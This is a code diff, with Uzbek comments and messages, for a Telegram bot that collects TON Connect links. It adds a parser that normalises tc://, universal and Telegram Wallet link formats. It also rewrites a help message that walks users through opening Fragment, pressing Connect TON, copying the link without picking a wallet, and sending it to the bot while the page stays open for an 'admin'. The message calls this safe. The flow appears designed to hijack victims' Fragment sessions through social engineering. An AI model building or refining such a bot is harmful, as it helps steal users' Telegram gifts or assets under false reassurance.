@@ -1,6 +1,7 @@
 """Bot va admin sayt birga ishlatadigan biznes-logika."""
 import logging
 import re
+from urllib.parse import unquote
 import time
 from pathlib import Path
 
@@ -47,11 +48,24 @@ def parse_nft_link(link: str):
 
 
 def extract_tc_link(text: str):
-    """Fragment'dagi 'Connect TON' havolasini ajratib oladi (tc://... yoki ...?v=2&id=...)."""
+    """Fragment 'Connect TON' oynasidagi havolani standart tc:// ko'rinishga keltiradi.
+    Qabul qilinadi: tc://..., https://...?v=2&id=..., Telegram Wallet/Walt havolasi (...tonconnect-v__2-id__...)."""
     if not text:
         return None
-    m = re.search(r"(tc://\S+|https?://\S*[?&]v=2&id=\S+|\S*ton-connect\S*)", text)
-    return m.group(1) if m else None
+    text = text.strip()
+    m = re.search(r"tc://\S+", text)
+    if m:
+        return m.group(0)
+    m = re.search(r"tonconnect-([A-Za-z0-9_\-]+)", text)  # Walt / Telegram Wallet formati
+    if m:
+        q = m.group(1).replace("--", "%").replace("__", "=").replace("-", "&")
+        q = "&".join(unquote(k) + "=" + v for k, _, v in (p.partition("=") for p in q.split("&")))
+        if "v=2" in q and "id=" in q:
+            return "tc://?" + q
+    m = re.search(r"https?://\S*[?&](v=2&id=\S+)", text)  # Tonkeeper va boshqa universal havolalar
+    if m:
+        return "tc://?" + m.group(1)
+    return None
 
 
 async def send(bot: Bot, chat_id, text, **kw):
@@ -93,9 +107,9 @@ def order_text(o, g):
 
 LINK_HELP = (
     "🔗 <b>Oxirgi qadam — sovg'ani profilingizga ulash</b>\n\n"
-    "1️⃣ <a href=\"https://fragment.com\">fragment.com</a> ni oching va <b>Log in</b> orqali Telegram bilan kiring\n"
+    "1️⃣ <a href=\"https://fragment.com\">fragment.com</a> ni <b>Safari/Chrome'da</b> oching va <b>Log in</b> orqali Telegram bilan kiring\n"
     "2️⃣ Yuqori o'ngdagi ko'k <b>Connect TON</b> tugmasini bosing\n"
-    "3️⃣ Chiqqan oynada <b>havolani nusxalang</b> (<code>tc://…</code> bilan boshlanadi)\n"
+    "3️⃣ Chiqqan oynada <b>Copy Link</b> ni bosing (hamyon nomini bosmang!)\n"
     "4️⃣ Havolani shu yerga yuboring\n\n"
     "⚠️ Admin ulaguncha Fragment sahifasini yopmang.\n"
     "🔒 Bu xavfsiz: biz faqat sovg'ani profilingizda <b>ko'rsatish</b> uchun ulaymiz. "
